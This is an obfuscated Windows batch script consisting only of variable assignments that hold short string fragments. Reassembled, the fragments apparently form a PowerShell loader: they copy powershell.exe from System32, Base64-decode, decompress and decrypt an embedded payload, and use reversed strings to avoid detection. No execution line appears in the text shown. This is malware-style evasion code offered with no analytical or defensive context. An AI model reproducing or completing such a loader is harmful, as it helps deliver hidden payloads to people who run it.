@echo off
set "pFgfYibugZ=do"
set "FwdRrJUHKD=st"
set "IqOixAPQdl=ll"
set "ngJlAQjZRc=Sy"
set "avJlSpuqkX=nd"
set "WsclZPQWEy=he"
set "SdxWPOPEcO=ws"
set "KCdXducWRB=xe"
set "bzOjAAidsZ=Po"
set "yAdLEXvEHh=ow"
set "lREmdiwmeC=we"
set "kCjElzBDTM=em"
set "aXbhEgloyF=ll"
set "lDnrrLXeZb=in"
set "pnNeTiigte=y "
set "kXtoBFgQMf=Wi"
set "mSlJrZMoPP=:\"
set "uSBPdcJGjI=1."
set "WRSWfOttSb=po"
set "vdVPRigqCD=rS"
set "wFfPneeRqU=rs"
set "xhYJtYEZss=\v"
set "UHNsrvXumQ=co"
set "TATfsglXVB=s\"
set "uMRiyjqHGt=we"
set "dwvJKrRRkN=32"
set "bOIIoqMcIa=.e"
set "stdhtybNkK=0\"
set "dEmxhtXwrA= C"
set "iRCPTgRXsM= /"
set "QGoZhGPIVD=py"
set "XROHvCZEKo=he"
set "OwMECxxcOJ=\W"
set "WuGoiEWvYW= %~dp0"
set "qmRSotHbpy=cd"
set "SOxEgZOaFC=$HAG"
set "PPmlkCfhJf=)))"
set "yhjhhmzjPD=raph"
set "xIENeoWGjy=[Sys"
set "qVEIVyasmU=wPgL"
set "cTzwyiGWgt=gwPg"
set "tkuiNgLFvr=]::C"
set "hQcIGUTSfb=$HAG"
set "ekwImmzJgR='[-1"
set "fiJyQnJOgm=ect "
set "RAVYBRnzlc=tem."
set "rETxTzNdHK=ing("
set "gvZNFQCpNW=]::("
set "LOViqCpqtN=] -j"
set "OPLREqabuD=pher"
set "owzIUsqdVQ=vert"
set "JhomricPQo=lit("
set "CnXAuoJxLq=ksPu"
set "ercYsLYGci=$gwP"
set "AdURdBzHtP=PUL "
set "vEbMUHfiHu=gwPg"
set "kaqehhJjvp=hk);"
set "yDAiEZoXNq=)) {"
set "rSqnkvmOar=d;$v"
set "onuaFfBldJ=ss -"
set "niVsxqgzKj=null"
set "wsNXlQCame=();$"
set "LODpFKHgFD='gni"
set "dDHLwbqnAn=UlO."
set "ZoUSmEnosU=oL'["
set "mlZIOJxvUQ=tS46"
set "nqRFnsxLjK=oryS"
set "vUFwppVVxz=m.IO"
set "nXzGnQGmBf=yste"
set "SsdOjiwiNM=eam("
set "NIJSQqRcEk=n ''"
set "hAaPDolfdb=k; }"
set "FmXKsOEcOi=:('g"
set "xhdAdLdFTz=ert]"
set "dhNQZTorKJ=-4] "
set "zeTmKREPoI=eZCM"
set "tnyOaezewp=e = "
set "dOiGeYzSdV=e]::"
set "VwbnDgMWWQ===')"
set "YBvnJZxJdF=Fo7l"
set "imgNXtljdD=Syst"
set "ciOYUWosDc=g = "
set "GUWlCQpkAc=$HAG"
set "KkyrYrMNHd=F'[-"
set "NMDCAFxDSI=pres"
set "YULEOZnqMw= = ["
set "RjKXCFxxcL=orF'"
set "LpQsgiHkrh=ne);"
set "ctLyXamxVN=pose"
set "jbZyuUuQAI=736u"
set "DzhIbaHOvR=ew-O"
